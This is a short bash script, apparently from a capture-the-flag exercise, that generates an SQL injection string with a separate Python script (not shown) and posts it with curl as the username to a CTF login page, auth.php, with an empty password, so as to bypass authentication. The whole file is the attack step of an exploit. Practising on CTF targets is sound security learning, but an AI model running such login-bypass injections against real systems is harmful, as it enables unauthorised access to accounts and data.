#!/bin/bash

sql=`python2.7 ./sql.py`
curl http://ctf.s/levels/auth/auth.php -d username="$sql" -d password=""
